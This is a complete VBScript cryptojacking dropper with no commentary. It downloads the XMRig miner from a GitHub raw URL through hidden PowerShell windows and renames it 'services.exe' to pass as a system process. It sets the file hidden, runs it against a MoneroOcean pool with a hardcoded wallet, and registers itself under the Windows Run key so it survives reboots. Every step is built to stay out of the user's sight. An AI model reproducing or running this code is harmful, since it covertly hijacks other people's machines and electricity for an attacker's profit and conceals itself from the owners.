' --- START OF CODE ---
Option Explicit

Dim wsh, fso, strScriptPath, psCommand
Dim minerFolder, minerName, wallet, pool, downloadUrl

Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- MINER CONFIG ---
wallet = "48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rRZd7vVXjRTnWEBBE33BC2sdw9k"
pool = "gulf.moneroocean.stream:10128"
downloadUrl = "https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/xmrig.exe"

minerFolder = wsh.SpecialFolders("AppData") & "\miner"
minerName = "services.exe"

' 1. Create Folder
If Not fso.FolderExists(minerFolder) Then
 wsh.Run "cmd /c mkdir " & Chr(34) & minerFolder & Chr(34), 0, True
End If

' 2. Download (Hidden)
psCommand = "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & minerFolder & "\xmrig.exe'"
wsh.Run psCommand, 0, True
WScript.Sleep 3000

' 3. Rename (Hidden)
psCommand = "powershell -WindowStyle Hidden -Command Rename-Item '" & minerFolder & "\xmrig.exe' '" & minerName & "'"
wsh.Run psCommand, 0, True
WScript.Sleep 1000

' 4. Hide File
fso.GetFile(minerFolder & "\" & minerName).Attributes = 2

' 5. Run Miner (Hidden)
wsh.Run """" & minerFolder & "\" & minerName & """ -o " & pool & " -u " & wallet & " --cpu-priority 1 --threads=2", 0, False

' --- PERSISTENCE (Registry Startup) ---
strScriptPath = WScript.ScriptFullName
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\XMRigMiner", "wscript.exe """ & strScriptPath & """"
' --- END OF CODE ---
